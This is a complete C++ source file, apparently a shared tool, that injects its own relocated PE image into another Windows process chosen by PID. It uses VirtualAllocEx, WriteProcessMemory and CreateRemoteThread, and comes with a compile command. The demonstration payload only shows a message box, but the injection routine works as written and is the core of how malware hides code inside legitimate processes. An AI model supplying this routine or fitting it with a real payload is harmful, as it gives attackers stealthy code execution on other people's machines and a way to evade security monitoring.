/*
 * Author: zwclose7
 * Compile: wine g++.exe ./pe-inject-by-zwclose7.cpp -lws2_32 -o pe-inject-by-zwclose7.exe
 *
 */

#include <stdio.h>
#include <Windows.h>
 
DWORD WINAPI ThreadProc(PVOID p)
{
    MessageBox(NULL,"Message from injected code!","Message",MB_ICONINFORMATION);
    return 0;
}
 
int main(int argc,char* argv[])
{
    PIMAGE_DOS_HEADER pIDH;
    PIMAGE_NT_HEADERS pINH;
    PIMAGE_BASE_RELOCATION pIBR;
 
    HANDLE hProcess,hThread;
    PUSHORT TypeOffset;
 
    PVOID ImageBase,Buffer,mem;
    ULONG i,Count,Delta,*p;
 
    if(argc<2)
    {
        printf("\nUsage: PEInject2 [PID]\n");
        return -1;
    }
 
    printf("\nOpening target process\n");
 
    hProcess=OpenProcess(
        PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE,
        FALSE,
        strtoul(argv[1],NULL,0));
 
    if(!hProcess)
    {
        printf("\nError: Unable to open target process (%u)\n",GetLastError());
        return -1;
    }
 
    ImageBase=GetModuleHandle(NULL);
    printf("\nImage base in current process: %#x\n",ImageBase);
 
    pIDH=(PIMAGE_DOS_HEADER)ImageBase;
    pINH=(PIMAGE_NT_HEADERS)((PUCHAR)ImageBase+pIDH->e_lfanew);
 
    printf("\nAllocating memory in target process\n");
    mem=VirtualAllocEx(hProcess,NULL,pINH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
 
    if(!mem)
    {
        printf("\nError: Unable to allocate memory in target process (%u)\n",GetLastError());
 
        CloseHandle(hProcess);
        return 0;
    }
 
    printf("\nMemory allocated at %#x\n",mem);
 
    Buffer=VirtualAlloc(NULL,pINH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    memcpy(Buffer,ImageBase,pINH->OptionalHeader.SizeOfImage);
 
    printf("\nRelocating image\n");
 
    pIBR=(PIMAGE_BASE_RELOCATION)((PUCHAR)Buffer+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    Delta=(ULONG)mem-(ULONG)ImageBase;
 
    printf("\nDelta: %#x\n",Delta);
 
    while(pIBR->VirtualAddress)
    {
        if(pIBR->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION))
        {
            Count=(pIBR->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(USHORT);
            TypeOffset=(PUSHORT)(pIBR+1);
 
            for(i=0;i<Count;i++)
            {
                if(TypeOffset[i])
                {
                    p=(PULONG)((PUCHAR)Buffer+pIBR->VirtualAddress+(TypeOffset[i] & 0xFFF));
                    *p+=Delta;
                }
            }
        }
 
        pIBR=(PIMAGE_BASE_RELOCATION)((PUCHAR)pIBR+pIBR->SizeOfBlock);
    }
 
    printf("\nWriting relocated image into target process\n");
 
    if(!WriteProcessMemory(hProcess,mem,Buffer,pINH->OptionalHeader.SizeOfImage,NULL))
    {
        printf("\nError: Unable to write process memory (%u)\n",GetLastError());
 
        VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
        CloseHandle(hProcess);
 
        return -1;
    }
 
    VirtualFree(Buffer,0,MEM_RELEASE);
 
    printf("\nCreating thread in target process\n");
    hThread=CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)((PUCHAR)ThreadProc+Delta),NULL,0,NULL);
 
    if(!hThread)
    {
        printf("\nError: Unable to create thread in target process (%u)\n",GetLastError());
 
        VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
        CloseHandle(hProcess);
 
        return -1;
    }
 
    printf("\nWaiting for the thread to terminate\n");
    WaitForSingleObject(hThread,INFINITE);
 
    printf("\nThread terminated\n\nFreeing allocated memory\n");
 
    VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
    CloseHandle(hProcess);
 
    return 0;
}

